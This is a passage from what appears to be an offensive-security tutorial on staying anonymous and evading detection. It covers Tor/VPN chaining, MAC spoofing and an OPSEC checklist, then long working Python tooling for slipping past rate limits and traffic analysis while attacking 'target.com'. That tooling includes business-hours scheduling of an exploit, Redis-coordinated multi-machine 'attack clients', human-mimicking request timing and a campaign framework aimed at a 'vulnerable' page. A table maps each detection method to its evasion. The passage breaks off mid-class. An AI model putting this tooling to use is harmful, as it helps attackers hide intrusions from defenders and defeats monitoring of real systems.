# Use Tor SOCKS proxy
proxychains4 curl http://check.torproject.org

# Configuration 2: Tor -> VPN
# /etc/tor/torrc
SocksPort 9050
TransPort 9040

# Route VPN through Tor
# In VPN config, add:
socks-proxy 127.0.0.1 9050
```

### VPN Kill Switch

**Preventing IP Leaks on VPN Disconnect**

**IPTables Kill Switch**

```bash
#!/bin/bash
# Block all traffic except through VPN

VPN_INTERFACE="tun0"
VPN_SERVER="vpn-server.com"

# Flush existing rules
iptables -F
iptables -X

# Default policies: DROP everything
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow VPN connection establishment
iptables -A OUTPUT -d $VPN_SERVER -j ACCEPT
iptables -A INPUT -s $VPN_SERVER -j ACCEPT

# Allow all traffic through VPN interface
iptables -A OUTPUT -o $VPN_INTERFACE -j ACCEPT
iptables -A INPUT -i $VPN_INTERFACE -j ACCEPT

# Allow DNS through VPN only
iptables -A OUTPUT -o $VPN_INTERFACE -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -o $VPN_INTERFACE -p tcp --dport 53 -j ACCEPT

echo "Kill switch activated. Only VPN traffic allowed."
```

**OpenVPN Built-in Protection**

```bash
# client.ovpn configuration
pull-filter ignore "redirect-gateway"  # Don't auto-route all traffic
route-nopull  # Don't accept pushed routes
up /etc/openvpn/up.sh  # Script on connection
down /etc/openvpn/down.sh  # Script on disconnection

# /etc/openvpn/up.sh
#!/bin/bash
# Enable firewall rules when VPN connects
iptables-restore < /etc/iptables/vpn-up.rules

# /etc/openvpn/down.sh
#!/bin/bash
# Block all traffic when VPN disconnects
iptables-restore < /etc/iptables/vpn-down.rules
```

### Split Tunneling

**Selective Routing Through VPN**

**Route-Based Split Tunnel**

```bash
# Route only specific IPs through VPN

# After VPN connection, add specific routes
ip route add 10.0.0.0/8 via VPN_GATEWAY dev tun0
ip route add 192.168.1.0/24 via VPN_GATEWAY dev tun0

# Default route stays through normal interface
# Only specified networks use VPN
```

**Application-Based Split Tunnel**

```bash
# Use network namespaces (Linux)

# Create namespace for VPN
ip netns add vpn_ns

# Move VPN interface to namespace
ip link set tun0 netns vpn_ns

# Configure namespace routing
ip netns exec vpn_ns ip route add default dev tun0

# Run specific application in namespace
ip netns exec vpn_ns firefox

# This Firefox instance uses VPN, others don't
```

### DNS Configuration for Anonymity

**Encrypted DNS Protocols**

**DNS over TLS (DoT)**

```bash
# Using stubby
apt install stubby

# /etc/stubby/stubby.yml
resolution_type: GETDNS_RESOLUTION_STUB
dns_transport_list:
  - GETDNS_TRANSPORT_TLS
tls_authentication: GETDNS_AUTHENTICATION_REQUIRED
upstream_recursive_servers:
  - address_data: 1.1.1.1
    tls_auth_name: "cloudflare-dns.com"
  - address_data: 1.0.0.1
    tls_auth_name: "cloudflare-dns.com"

# Start stubby
systemctl start stubby

# Configure system to use stubby
# /etc/resolv.conf
nameserver 127.0.0.1
```

**DNS over HTTPS (DoH)**

```bash
# Using cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
dpkg -i cloudflared-linux-amd64.deb

# Configure as DNS proxy
cloudflared proxy-dns --port 5053 --upstream https://1.1.1.1/dns-query

# Update resolv.conf
nameserver 127.0.0.1
options edns0 trust-ad
```

**DNSCrypt**

```bash
# Install dnscrypt-proxy
apt install dnscrypt-proxy

# /etc/dnscrypt-proxy/dnscrypt-proxy.toml
server_names = ['cloudflare', 'google']
listen_addresses = ['127.0.0.1:53']
fallback_resolver = '1.1.1.1:53'
dnscrypt_servers = true
doh_servers = true

# Start service
systemctl start dnscrypt-proxy

# Update resolv.conf
nameserver 127.0.0.1
```

### MAC Address Spoofing

**Randomizing Hardware Identifiers**

```bash
# Change MAC address before connecting

# Check current MAC
ip link show eth0

# Bring interface down
ip link set dev eth0 down

# Change MAC address
ip link set dev eth0 address 02:01:02:03:04:05

# Or use macchanger for random MAC
macchanger -r eth0

# Bring interface up
ip link set dev eth0 up

# Automate on boot
# /etc/network/if-pre-up.d/macchanger
#!/bin/sh
macchanger -r $IFACE
```

### Anonymous Operating Systems

**Tails (The Amnesic Incognito Live System)**

```bash
# [Unverified] Tails features:
# - Routes all traffic through Tor
# - Leaves no trace (live system)
# - Built-in encryption tools
# - Amnesia feature (RAM only)

# Usage: Boot from USB, all traffic auto-routed through Tor
# No installation required, reboot clears all data
```

**Whonix (Tor-focused Security)**

```bash
# Two VM architecture:
# - Gateway VM (Tor gateway)
# - Workstation VM (isolated environment)

# [Inference] Workstation has no direct network access
# All traffic forced through Gateway's Tor

# Setup requires virtualization (VirtualBox/KVM)
# Download from whonix.org
```

### Anonymization Best Practices

**Operational Security Checklist**

```
[ ] Use VPN from provider outside your jurisdiction
[ ] Enable kill switch before connecting
[ ] Verify no DNS leaks (dnsleaktest.com)
[ ] Verify no WebRTC leaks (browserleaks.com/webrtc)
[ ] Check IP reputation (whoer.net)
[ ] Disable IPv6 (often not routed through VPN)
[ ] Use encrypted DNS (DoH/DoT/DNSCrypt)
[ ] Randomize MAC address
[ ] Match timezone to VPN location
[ ] Use separate browser profile for anonymous activities
[ ] Clear cookies/cache before VPN connection
[ ] [Inference] Never mix anonymous and personal activities in same session
```

**Multi-Layer Anonymization**

```
Recommended stack for maximum anonymity:
1. Physical: Public WiFi (not home network)
2. Hardware: Spoofed MAC address
3. Network: VPN (paid with cryptocurrency)
4. Transport: Tor Browser
5. Application: No personal accounts/information
```

---

## Timing Attacks to Avoid Detection

### Understanding Timing-Based Detection

**Rate Limiting Mechanisms**

**Request-Per-Minute Limits**

```python
# Common rate limit patterns:
# - 60 requests per minute (1 req/sec)
# - 100 requests per hour
# - 1000 requests per day

# Detection via HTTP headers
import requests

response = requests.get('http://target.com/api/endpoint')

# Check rate limit headers
print(response.headers.get('X-RateLimit-Limit'))      # Total allowed
print(response.headers.get('X-RateLimit-Remaining'))  # Remaining requests
print(response.headers.get('X-RateLimit-Reset'))      # Reset timestamp
print(response.headers.get('Retry-After'))            # Seconds until retry
```

**Token Bucket Algorithm**

```python
# [Inference] Many systems use token bucket for rate limiting
# Tokens regenerate over time, requests consume tokens

class TokenBucket:
    """Simple token bucket rate limiter"""
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity  # Max tokens
        self.tokens = capacity
        self.refill_rate = refill_rate  # Tokens per second
        self.last_refill = time.time()
    
    def consume(self, tokens=1):
        self._refill()
        if self.tokens >= tokens:
            self.tokens -= tokens
            return True
        return False
    
    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        self.tokens = min(self.capacity, self.tokens + elapsed * self.refill_rate)
        self.last_refill = now
```

**Sliding Window Rate Limiting**

```python
# Tracks requests within rolling time window
# Example: Max 100 requests in any 60-second window

from collections import deque
import time

class SlidingWindowLimiter:
    def __init__(self, max_requests, window_seconds):
        self.max_requests = max_requests
        self.window = window_seconds
        self.requests = deque()
    
    def allow_request(self):
        now = time.time()
        # Remove requests outside window
        while self.requests and self.requests[0] < now - self.window:
            self.requests.popleft()
        
        if len(self.requests) < self.max_requests:
            self.requests.append(now)
            return True
        return False
```

### Timing Attack Strategies

**Adaptive Rate Control**

**Exponential Backoff**

```python
import time
import random
import requests
from requests import Session, exceptions

def exponential_backoff_request(url, max_retries=5, backoff_factor=1.0, status_forcelist=(429, 500, 502, 503, 504), timeout=10):
    """
    Make a GET request with exponential backoff + jitter on retryable errors.

    Parameters
    - url: str - target URL
    - max_retries: int - maximum retry attempts (total attempts = max_retries)
    - backoff_factor: float - base multiplier for delay (seconds)
    - status_forcelist: tuple[int] - HTTP status codes that should trigger a retry
    - timeout: int|float - request timeout in seconds

    Returns:
    - requests.Response on success (status_code 200)
    - None on permanent failure
    """
    session = Session()

    for attempt in range(1, max_retries + 1):
        try:
            resp = session.get(url, timeout=timeout)
        except exceptions.RequestException as exc:
            # Network-level error: consider retrying
            if attempt == max_retries:
                print(f"[!] Network error (attempt {attempt}/{max_retries}): {exc}. Giving up.")
                return None
            # compute delay with jitter
            delay = backoff_factor * (2 ** (attempt - 1)) + random.uniform(0, 1)
            print(f"[!] Network error (attempt {attempt}/{max_retries}): {exc}. Retrying in {delay:.2f}s...")
            time.sleep(delay)
            continue

        # Successful HTTP response object received
        if resp.status_code == 200:
            return resp

        if resp.status_code in status_forcelist:
            if attempt == max_retries:
                print(f"[!] Received status {resp.status_code} on final attempt ({attempt}). Giving up.")
                return None
            delay = backoff_factor * (2 ** (attempt - 1)) + random.uniform(0, 1)
            print(f"[!] Received status {resp.status_code} (attempt {attempt}/{max_retries}). Retrying in {delay:.2f}s...")
            time.sleep(delay)
            continue

        # Non-retryable error: show status and return None
        print(f"[!] Non-retryable response: HTTP {resp.status_code}")
        return None

    return None  # fallback (shouldn't normally reach here)


# Usage example (replace with a real URL)
if __name__ == "__main__":
    url = "http://target.com/api/data"
    response = exponential_backoff_request(url, max_retries=5)
    if response:
        print("Response status:", response.status_code)
        # print first 500 chars of body to avoid huge output
        print("Body (truncated):", response.text[:500])
    else:
        print("Request failed after retries.")
````

**Jitter Addition**
```python
import random
import time

def request_with_jitter(url, base_delay=1.0, jitter_range=0.5):
    """Add random jitter to avoid pattern detection"""
    
    # Calculate delay with random jitter
    jitter = random.uniform(-jitter_range, jitter_range)
    delay = max(0.1, base_delay + jitter)  # Ensure positive delay
    
    print(f"[*] Waiting {delay:.2f} seconds...")
    time.sleep(delay)
    
    return requests.get(url)

# Multiple requests with randomized timing
for i in range(100):
    response = request_with_jitter('http://target.com/page', base_delay=2.0, jitter_range=1.0)
    # Actual delays: ~1.0 to ~3.0 seconds (2.0 ± 1.0)
````

**Adaptive Rate Detection**

```python
import time
import requests

class AdaptiveRateLimiter:
    """Automatically adjust request rate based on server responses"""
    
    def __init__(self, initial_delay=1.0):
        self.delay = initial_delay
        self.success_count = 0
        self.min_delay = 0.1
        self.max_delay = 60.0
    
    def make_request(self, url):
        time.sleep(self.delay)
        
        try:
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                self._handle_success()
                return response
            elif response.status_code == 429:
                self._handle_rate_limit(response)
                return None
            else:
                return response
                
        except requests.exceptions.Timeout:
            self._handle_timeout()
            return None
    
    def _handle_success(self):
        """Gradually decrease delay on success"""
        self.success_count += 1
        
        # After 10 consecutive successes, try faster rate
        if self.success_count >= 10:
            self.delay = max(self.min_delay, self.delay * 0.9)
            self.success_count = 0
            print(f"[+] Decreased delay to {self.delay:.2f}s")
    
    def _handle_rate_limit(self, response):
        """Increase delay when rate limited"""
        self.success_count = 0
        
        # Check for Retry-After header
        retry_after = response.headers.get('Retry-After')
        if retry_after:
            self.delay = int(retry_after)
        else:
            # Double the delay
            self.delay = min(self.max_delay, self.delay * 2)
        
        print(f"[-] Rate limited. Increased delay to {self.delay:.2f}s")
    
    def _handle_timeout(self):
        """Increase delay on timeout"""
        self.delay = min(self.max_delay, self.delay * 1.5)
        print(f"[!] Timeout. Increased delay to {self.delay:.2f}s")

# Usage
limiter = AdaptiveRateLimiter(initial_delay=2.0)
for i in range(1000):
    response = limiter.make_request('http://target.com/api/data')
    if response:
        print(f"[{i}] Success: {response.status_code}")
```

### Human-Like Request Patterns

**Simulating User Behavior**

**Realistic Browse Simulation**

```python
import time
import random
import requests

class HumanBehaviorSimulator:
    """Simulate realistic human browsing patterns"""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
        # Realistic user agent
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def read_time(self, content_length):
        """Calculate realistic reading time based on content length"""
        # Average reading: 200-250 words per minute
        # Assume ~5 chars per word
        words = content_length / 5
        read_seconds = (words / 225) * 60  # 225 words/min average
        
        # Add variance (some people read faster/slower)
        variance = random.uniform(0.7, 1.3)
        return read_seconds * variance
    
    def scroll_pause(self):
        """Simulate scrolling pauses"""
        # Humans pause while scrolling (0.5-3 seconds)
        return random.uniform(0.5, 3.0)
    
    def browse_page(self, url):
        """Browse a page with realistic timing"""
        
        print(f"[*] Navigating to {url}")
        response = self.session.get(url)
        
        if response.status_code != 200:
            return response
        
        # Simulate initial page load time
        time.sleep(random.uniform(0.5, 1.5))
        
        # Calculate reading time
        content_length = len(response.content)
        read_time = self.read_time(content_length)
        
        print(f"[*] Reading for {read_time:.1f} seconds...")
        
        # Simulate scrolling behavior (read in chunks)
        chunks = random.randint(2, 5)
        for i in range(chunks):
            time.sleep(read_time / chunks)
            time.sleep(self.scroll_pause())
        
        return response
    
    def browse_sequence(self, urls):
        """Browse multiple pages in sequence"""
        
        for i, url in enumerate(urls):
            self.browse_page(url)
            
            # Inter-page delay (clicking links, thinking)
            if i < len(urls) - 1:
                delay = random.uniform(2.0, 8.0)
                print(f"[*] Pausing {delay:.1f}s before next page...\n")
                time.sleep(delay)
    
    def search_and_browse(self, search_term):
        """Simulate search engine usage then browsing results"""
        
        # Visit search engine
        print("[*] Visiting search engine...")
        self.browse_page(f"{self.base_url}/")
        
        # Perform search
        print(f"[*] Searching for: {search_term}")
        time.sleep(random.uniform(1.0, 3.0))  # Typing time
        
        search_url = f"{self.base_url}/search?q={search_term}"
        self.browse_page(search_url)
        
        # Click on result (simulate)
        time.sleep(random.uniform(1.0, 5.0))  # Reading results, deciding
        
        return True

# Usage example
simulator = HumanBehaviorSimulator('http://target.com')

# Simulate realistic browsing session
pages = [
    'http://target.com/',
    'http://target.com/about',
    'http://target.com/products',
    'http://target.com/products/item-123',  # Target page with exploit
    'http://target.com/contact'
]

simulator.browse_sequence(pages)
```

**Mouse Movement & Interaction Timing**

```python
# For browser automation (Selenium/Puppeteer)
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
import time
import random

def human_like_mouse_movement(driver, element):
    """Move mouse to element with realistic curve"""
    action = ActionChains(driver)
    
    # Get element location
    location = element.location
    size = element.size
    
    # Target center of element
    target_x = location['x'] + size['width'] / 2
    target_y = location['y'] + size['height'] / 2
    
    # Move in small increments (simulate human cursor movement)
    steps = random.randint(10, 20)
    for i in range(steps):
        # Add slight randomness to path (not perfectly straight)
        offset_x = random.randint(-5, 5)
        offset_y = random.randint(-5, 5)
        
        action.move_by_offset(offset_x, offset_y)
        time.sleep(random.uniform(0.01, 0.03))
    
    # Final move to element
    action.move_to_element(element)
    
    # Pause before click (humans don't click instantly)
    time.sleep(random.uniform(0.1, 0.3))
    
    action.click()
    action.perform()

def human_like_typing(element, text):
    """Type text with realistic timing"""
    
    for char in text:
        element.send_keys(char)
        
        # Typing speed variation
        if char == ' ':
            delay = random.uniform(0.1, 0.2)  # Longer pause for spaces
        elif random.random() < 0.05:  # 5% chance of thinking pause
            delay = random.uniform(0.3, 0.8)
        else:
            delay = random.uniform(0.05, 0.15)  # Normal typing
        
        time.sleep(delay)
```

### Time-of-Day Based Attacks

**Operating During Business Hours**

**Timezone-Aware Scheduling**

```python
from datetime import datetime, time
import pytz
import time as time_module

class TimingStrategy:
    """Execute attacks during specific time windows"""
    
    def __init__(self, target_timezone='America/New_York'):
        self.target_tz = pytz.timezone(target_timezone)
    
    def is_business_hours(self):
        """Check if current time is business hours in target timezone"""
        target_time = datetime.now(self.target_tz)
        
        # Business hours: Monday-Friday, 9 AM - 5 PM
        if target_time.weekday() >= 5:  # Saturday=5, Sunday=6
            return False
        
        business_start = time(9, 0)
        business_end = time(17, 0)
        
        current_time = target_time.time()
        return business_start <= current_time <= business_end
    
    def is_peak_hours(self):
        """Check if during peak traffic hours"""
        target_time = datetime.now(self.target_tz)
        current_time = target_time.time()
        
        # Peak hours: 10 AM - 12 PM, 2 PM - 4 PM
        morning_peak = time(10, 0) <= current_time <= time(12, 0)
        afternoon_peak = time(14, 0) <= current_time <= time(16, 0)
        
        return morning_peak or afternoon_peak
    
    def wait_for_window(self, window_type='business'):
        """Wait until appropriate time window"""
        
        check_func = self.is_business_hours if window_type == 'business' else self.is_peak_hours
        
        while not check_func():
            target_time = datetime.now(self.target_tz)
            print(f"[*] Current time: {target_time.strftime('%Y-%m-%d %H:%M:%S %Z')}")
            print(f"[*] Waiting for {window_type} hours...")
            time_module.sleep(300)  # Check every 5 minutes
        
        print(f"[+] {window_type.capitalize()} hours detected. Proceeding...")
    
    def execute_with_timing(self, func, *args, **kwargs):
        """Execute function only during business hours"""
        
        if not self.is_business_hours():
            print("[!] Outside business hours. Waiting...")
            self.wait_for_window('business')
        
        return func(*args, **kwargs)

# Usage
strategy = TimingStrategy('America/Los_Angeles')

def exploit_target():
    print("[*] Executing exploit...")
    # Exploit code here

# Wait for business hours before executing
strategy.execute_with_timing(exploit_target)
```

**Blending with Legitimate Traffic**

```python
import requests
import time
import random
from datetime import datetime

class TrafficBlender:
    """Match request patterns to legitimate traffic volume"""
    
    def __init__(self, baseline_requests_per_hour=100):
        self.baseline_rph = baseline_requests_per_hour
        self.current_requests = 0
        self.hour_start = datetime.now()
    
    def calculate_delay(self, time_of_day):
        """
        Adjust request rate based on expected legitimate traffic
        [Inference] More traffic during business hours = more requests allowed
        """
        hour = time_of_day.hour
        
        # Traffic multipliers by hour (0.0-1.0)
        if 0 <= hour < 6:  # Night
            multiplier = 0.1
        elif 6 <= hour < 9:  # Morning ramp-up
            multiplier = 0.5
        elif 9 <= hour < 17:  # Business hours
            multiplier = 1.0
        elif 17 <= hour < 22:  # Evening decline
            multiplier = 0.6
        else:  # Late night
            multiplier = 0.2
        
        # Calculate requests allowed this hour
        allowed_rph = self.baseline_rph * multiplier
        
        # Delay between requests
        delay = 3600 / allowed_rph if allowed_rph > 0 else 3600
        
        # Add jitter
        return delay + random.uniform(-delay * 0.3, delay * 0.3)
    
    def make_timed_request(self, url):
        """Make request with timing appropriate for time of day"""
        
        # Reset counter if new hour
        current_time = datetime.now()
        if (current_time - self.hour_start).seconds >= 3600:
            self.current_requests = 0
            self.hour_start = current_time
        
        # Calculate appropriate delay
        delay = self.calculate_delay(current_time)
        
        print(f"[{current_time.strftime('%H:%M:%S')}] Request #{self.current_requests} - Delay: {delay:.1f}s")
        time.sleep(delay)
        
        response = requests.get(url)
        self.current_requests += 1
        
        return response

# Usage
blender = TrafficBlender(baseline_requests_per_hour=200)

for i in range(1000):
    response = blender.make_timed_request('http://target.com/api/data')
```

### Distributed Request Timing

**Coordinated Multi-Source Attacks**

**Distributed Rate Control**

```python
import redis
import time
import uuid

class DistributedRateLimiter:
    """
    Coordinate rate limiting across multiple attack machines
    [Inference] Prevents multiple sources from overwhelming rate limits
    """
    
    def __init__(self, redis_host='localhost', max_global_rps=10):
        self.redis = redis.Redis(host=redis_host, port=6379, decode_responses=True)
        self.client_id = str(uuid.uuid4())
        self.max_global_rps = max_global_rps
        self.key = 'global_rate_limiter'
    
    def acquire_slot(self):
        """Acquire permission to make request"""
        
        current_second = int(time.time())
        key = f"{self.key}:{current_second}"
        
        # Increment counter for this second
        count = self.redis.incr(key)
        
        # Set expiry if this is first request in this second
        if count == 1:
            self.redis.expire(key, 2)  # Expire after 2 seconds
        
        if count <= self.max_global_rps:
            return True
        else:
            return False
    
    def wait_for_slot(self):
        """Wait until slot available"""
        
        while not self.acquire_slot():
            print(f"[*] Global rate limit reached. Waiting...")
            time.sleep(0.1)
        
        print(f"[+] Slot acquired for client {self.client_id[:8]}")

# Usage across multiple machines
limiter = DistributedRateLimiter(redis_host='coordination-server.com', max_global_rps=5)

for i in range(100):
    limiter.wait_for_slot()
    # Make request
    response = requests.get('http://target.com/api')
```

**Time-Slotted Coordination**

```python
import time
from datetime import datetime, timedelta

class SlottedScheduler:
    """
    Assign time slots to different attack clients
    [Inference] Each client gets dedicated time windows
    """
    
    def __init__(self, client_id, total_clients, slot_duration=60):
        self.client_id = client_id
        self.total_clients = total_clients
        self.slot_duration = slot_duration  # seconds
    
    def is_my_slot(self):
        """Check if current time slot belongs to this client"""
        
        current_time = int(time.time())
        total_cycle = self.slot_duration * self.total_clients
        
        # Calculate current slot number
        current_slot = (current_time % total_cycle) // self.slot_duration
        
        return current_slot == self.client_id
    
    def wait_for_my_slot(self):
        """Wait until this client's time slot"""
        
        while not self.is_my_slot():
            seconds_until_slot = self.seconds_until_next_slot()
            print(f"[*] Waiting {seconds_until_slot}s for slot {self.client_id}...")
            time.sleep(min(seconds_until_slot, 10))
        
        print(f"[+] Client {self.client_id} slot active!")
    
    def seconds_until_next_slot(self):
        """Calculate seconds until next slot for this client"""
        
        current_time = int(time.time())
        total_cycle = self.slot_duration * self.total_clients
        time_in_cycle = current_time % total_cycle
        
        my_slot_start = self.client_id * self.slot_duration
        
        if time_in_cycle < my_slot_start:
            return my_slot_start - time_in_cycle
        else:
            return total_cycle - time_in_cycle + my_slot_start
    
    def execute_in_slot(self, func, *args, **kwargs):
        """Execute function during this client's slot"""
        
        self.wait_for_my_slot()
        
        start_time = time.time()
        while time.time() - start_time < self.slot_duration:
            if not self.is_my_slot():
                break
            func(*args, **kwargs)

# Usage: 5 attack clients, 60-second slots each
# Client 0: 0:00-1:00, 5:00-6:00, 10:00-11:00...
# Client 1: 1:00-2:00, 6:00-7:00, 11:00-12:00...
# etc.

scheduler = SlottedScheduler(client_id=2, total_clients=5, slot_duration=60)

def attack_function():
    response = requests.get('http://target.com/exploit')
    time.sleep(1)

scheduler.execute_in_slot(attack_function)
```

### Behavioral Timing Analysis Evasion

**Avoiding Statistical Anomalies**

**Request Interval Randomization**

```python
import numpy as np
import time

class AntiPatternDetection:
    """Generate request timing that avoids pattern detection"""
    
    def __init__(self):
        self.last_request_time = None
    
    def exponential_intervals(self, rate=0.5):
        """
        Generate intervals following exponential distribution
        [Inference] Natural processes follow exponential distribution
        Mimics human behavior better than fixed intervals
        """
        return np.random.exponential(1.0 / rate)
    
    def pareto_intervals(self, alpha=2.0, min_val=1.0):
        """
        Pareto distribution (power law)
        [Inference] Many human behaviors follow power law
        Most intervals short, occasional long pauses
        """
        return (np.random.pareto(alpha) + 1) * min_val
    
    def gaussian_intervals(self, mean=2.0, stddev=0.5):
        """
        Normal distribution around mean
        Most natural for consistent activity with variation
        """
        return max(0.1, np.random.normal(mean, stddev))
    
    def burst_pattern(self, burst_size=5, burst_interval=2.0, between_bursts=30.0):
        """
        Simulate burst behavior (rapid requests, then pause)
        [Inference] Humans often browse in bursts
        """
        for i in range(burst_size):
            yield burst_interval + np.random.uniform(-0.5, 0.5)
        
        yield between_bursts + np.random.uniform(-5, 5)
    
    def make_request_with_distribution(self, url, distribution='exponential'):
        """Make request with natural timing distribution"""
        
        if self.last_request_time:
            if distribution == 'exponential':
                delay = self.exponential_intervals(rate=0.5)
            elif distribution == 'pareto':
                delay = self.pareto_intervals(alpha=2.0, min_val=1.0)
            elif distribution == 'gaussian':
                delay = self.gaussian_intervals(mean=2.0, stddev=0.5)
            else:
                delay = 2.0
            
            print(f"[*] Delay: {delay:.2f}s (distribution: {distribution})")
            time.sleep(delay)
        
        self.last_request_time = time.time()
        return requests.get(url)

# Usage
anti_pattern = AntiPatternDetection()

for i in range(100):
    response = anti_pattern.make_request_with_distribution(
        'http://target.com/api',
        distribution='pareto'  # Most natural for web browsing
    )
```

**Session Duration Realism**

```python
import time
import random

class SessionManager:
    """Manage realistic session durations and breaks"""
    
    def __init__(self, avg_session_duration=1800, avg_break_duration=3600):
        self.avg_session = avg_session_duration  # 30 minutes
        self.avg_break = avg_break_duration  # 1 hour
        self.session_start = None
        self.requests_this_session = 0
    
    def should_take_break(self):
        """
        Determine if session should end
        [Inference] Humans don't browse indefinitely
        """
        if not self.session_start:
            return False
        
        session_duration = time.time() - self.session_start
        expected_duration = np.random.normal(self.avg_session, self.avg_session / 3)
        
        # Also consider request count (fatigue factor)
        fatigue_factor = self.requests_this_session / 50  # Every 50 requests increases probability
        
        return session_duration > expected_duration or random.random() < fatigue_factor * 0.1
    
    def take_break(self):
        """Simulate break between sessions"""
        break_duration = max(60, np.random.normal(self.avg_break, self.avg_break / 2))
        
        print(f"[*] Taking break for {break_duration/60:.1f} minutes...")
        time.sleep(break_duration)
        
        # Reset session
        self.session_start = time.time()
        self.requests_this_session = 0
        print("[+] Resuming activity...")
    
    def make_session_aware_request(self, url):
        """Make request with session management"""
        
        if not self.session_start:
            self.session_start = time.time()
        
        if self.should_take_break():
            self.take_break()
        
        response = requests.get(url)
        self.requests_this_session += 1
        
        return response

# Usage
session_mgr = SessionManager(avg_session_duration=1800, avg_break_duration=3600)

for i in range(1000):
    response = session_mgr.make_session_aware_request('http://target.com/api')
    time.sleep(random.uniform(1, 5))
```

### Advanced Timing Techniques

**Response Time Fingerprinting Evasion**

**Constant-Time Requests**

```python
import time

def constant_time_request(url, target_duration=1.0):
    """
    Make request with constant duration regardless of response time
    [Inference] Prevents timing-based fingerprinting
    """
    start_time = time.time()
    
    try:
        response = requests.get(url, timeout=target_duration - 0.1)
    except requests.exceptions.Timeout:
        response = None
    
    elapsed = time.time() - start_time
    remaining = target_duration - elapsed
    
    if remaining > 0:
        time.sleep(remaining)
    
    return response

# All requests take exactly 1 second, hiding actual response times
```

**Timing Channel Exploitation Prevention**

```python
def request_with_noise(url):
    """
    Add noise to hide timing channels
    [Inference] Defeats timing-based information leakage detection
    """
    
    # Add random pre-delay
    time.sleep(random.uniform(0, 0.5))
    
    response = requests.get(url)
    
    # Add random post-delay
    time.sleep(random.uniform(0, 0.5))
    
    return response
```

### Timing Attack Detection Summary

**Detection Indicators vs. Evasion**

|Detection Method|Indicator|Evasion Technique|
|---|---|---|
|**Fixed Interval**|Requests every X seconds exactly|Add jitter, use distribution|
|**Rate Spike**|Sudden increase in request rate|Gradual ramp-up, time-of-day aware|
|**Off-Hours Activity**|Requests during 2-6 AM|Business hours only, session breaks|
|**Constant Duration**|All sessions same length|Variable sessions, natural breaks|
|**Linear Pattern**|Sequentially incrementing IDs|Random access, realistic navigation|
|**No Think Time**|Instant form submissions|Add typing delays, reading time|
|**Burst Pattern**|Regular bursts (bot-like)|Irregular bursts, Pareto distribution|
|**No Errors**|100% success rate|Occasional failed requests (realistic)|

### Complete Timing Evasion Framework

**Integrated Timing Manager**

```python
import time
import random
import numpy as np
from datetime import datetime
import pytz

class ComprehensiveTimingManager:
    """Complete timing evasion framework"""
    
    def __init__(self, target_timezone='America/New_York'):
        self.target_tz = pytz.timezone(target_timezone)
        self.session_start = None
        self.request_count = 0
        self.last_request_time = None
    
    def should_operate_now(self):
        """Check if current time is appropriate for operations"""
        target_time = datetime.now(self.target_tz)
        
        # Only operate during business hours
        if target_time.weekday() >= 5:
            return False
        
        hour = target_time.hour
        return 9 <= hour < 17
    
    def calculate_smart_delay(self):
        """Calculate delay using multiple factors"""
        
        # Base delay from Pareto distribution (natural web behavior)
        base_delay = (np.random.pareto(2.0) + 1) * 1.0
        
        # Time-of-day multiplier
        current_hour = datetime.now(self.target_tz).hour
        if 12 <= current_hour < 14:  # Lunch hour - higher traffic
            multiplier = 0.7
        else:
            multiplier = 1.0
        
        # Fatigue factor (slow down after many requests)
        fatigue = 1.0 + (self.request_count / 100) * 0.5
        
        final_delay = base_delay * multiplier * fatigue
        
        # Add jitter
        jitter = random.uniform(-0.2, 0.2) * final_delay
        
        return max(0.5, final_delay + jitter)
    
    def make_timed_request(self, url):
        """Make request with comprehensive timing evasion"""
        
        # Check if we should operate
        if not self.should_operate_now():
            print("[!] Outside operating hours. Sleeping...")
            time.sleep(300)
            return None
        
        # Calculate delay
        if self.last_request_time:
            delay = self.calculate_smart_delay()
            print(f"[*] Waiting {delay:.2f}s...")
            time.sleep(delay)
        
        # Make request
        start_time = time.time()
        try:
            response = requests.get(url, timeout=10)
            self.request_count += 1
            self.last_request_time = time.time()
            
            # Simulate reading/interaction time based on response
            if response.status_code == 200:
                content_length = len(response.content)
                read_time = (content_length / 5000) * random.uniform(0.8, 1.2)
                time.sleep(min(read_time, 5.0))
            
            return response
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def execute_campaign(self, urls, max_requests=1000):
        """Execute full campaign with timing evasion"""
        
        completed = 0
        
        while completed < max_requests:
            # Randomly select URL
            url = random.choice(urls)
            
            response = self.make_timed_request(url)
            
            if response and response.status_code == 200:
                completed += 1
                print(f"[+] Completed {completed}/{max_requests}")
            
            # Session management (take breaks)
            if self.request_count > 0 and self.request_count % 50 == 0:
                break_time = random.uniform(300, 900)  # 5-15 min break
                print(f"[*] Taking break for {break_time/60:.1f} minutes...")
                time.sleep(break_time)

# Usage
timing_mgr = ComprehensiveTimingManager('America/New_York')

urls = [
    'http://target.com/page1',
    'http://target.com/page2',
    'http://target.com/vulnerable'  # Target with exploit
]

timing_mgr.execute_campaign(urls, max_requests=500)
```

---

**Related Topics**

- **Advanced Web Scraping Anti-Detection** - Captcha bypass, bot detection evasion
- **Traffic Analysis & OPSEC** - Network flow analysis, behavioral profiling countermeasures
- **Distributed Attack Coordination** - Botnet C2 communication, coordinated timing across nodes
- **Machine Learning Detection Evasion** - Adversarial examples, anomaly detection bypass
- **Cloud Security & CDN Bypass** - CloudFlare, Akamai, AWS Shield evasion techniques

---

## Additional Advanced Timing Techniques

### Statistical Detection Evasion

**Entropy-Based Timing**

```python
import time
import math
from collections import Counter

class EntropyBasedTiming:
    """
    Generate timing patterns with high entropy to evade statistical analysis
    [Inference] Low entropy patterns (predictable) are easier to detect
    """
    
    def __init__(self, min_delay=0.5, max_delay=10.0):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.history = []
    
